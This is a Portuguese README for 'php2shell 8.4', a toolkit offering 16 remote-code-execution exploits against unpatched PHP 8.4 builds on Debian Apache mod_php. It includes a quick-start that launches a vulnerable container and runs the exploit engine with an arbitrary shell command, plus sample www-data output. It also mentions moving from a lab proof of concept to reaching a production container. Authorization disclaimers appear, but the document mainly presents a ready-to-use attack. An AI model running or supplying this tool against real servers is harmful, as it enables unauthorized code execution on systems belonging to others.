# php2shell 8.4 — Debian Apache (mod_php)

16 exploits funcionais para as versões **8.4 pré-correção** do PHP, no alvo
**Debian + Apache mod_php** (`apache2handler`), perfil `php.ini-production`.

> **Uso autorizado apenas.** Execute somente em laboratório próprio ou em alvo
> com autorização escrita. A prova é um arquivo escrito no alvo; sem prova,
> o resultado **não** é RCE.

Idiomas: [pt-BR](README.md) · [English](docs/i18n/README.en.md) · [中文](docs/i18n/README.zh.md) ·
[فارسی](docs/i18n/README.fa.md) · [العربية](docs/i18n/README.ar.md) ·
[Русский](docs/i18n/README.ru.md) · [한국어](docs/i18n/README.ko.md)

## Versões cobertas (16)

| Faixa | Versões | `s_off` do stage 3 |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16 versões | `0xF8398` |

## O que está aqui

```text
engine/pure_fixed.js     motor A1→B1→A2→B2
profiles/*.json          16 perfis: símbolos, s_off, requisitos
run.js                   escolhe o perfil e executa o motor
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   valida os 16 perfis
```

Pesquisamos a vulnerabilidade de forma independente a partir da notícia inicial, construímos um PoC em laboratório e depois focamos em alcançar um container em produção.
O `run.js` não faz varredura: executa **uma** versão por vez, com a prova em
arquivo.

## Requisitos

- Node.js 20+ no operador.
- Docker no alvo/lab.
- Imagem oficial `php:<versão>-apache` (Debian) com o `target/php.ini` e o
  `target/apache.conf` montados.
- Volume compartilhado para a prova (`/out` no alvo).

## Início rápido (lab local)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Para outra versão, troque `8.4.26` pelo perfil desejado e a imagem `php:<versão>-apache`.

## Como ler o resultado

| Saída | Significado |
|:--|:--|
| `out/p1` contém `uid=...` | execução comprovada |
| motor diz “proof” mas o arquivo está vazio | **não é RCE**; falhou |
| `leak failed` / `no proof` | não executou; reinicie o alvo e tente de novo |

Cada tentativa deve começar com o worker limpo. O `run.js` não reinicia o
container por você; para reproduzir a matriz, reinicie o alvo entre tentativas.

## Limitações honestas

- É `www-data`, não root.
- O resultado depende do build exato da imagem; fixe a tag/digest ao repetir.

## Testes

```bash
node --test
```

## Documentação

- `docs/como-reproduzir.md` — passo a passo e diagnóstico.

## Aviso

Este material é de pesquisa defensiva/ofensiva autorizada. Não use contra
sistemas de terceiros sem permissão. A responsabilidade pelo uso é de quem
executa.
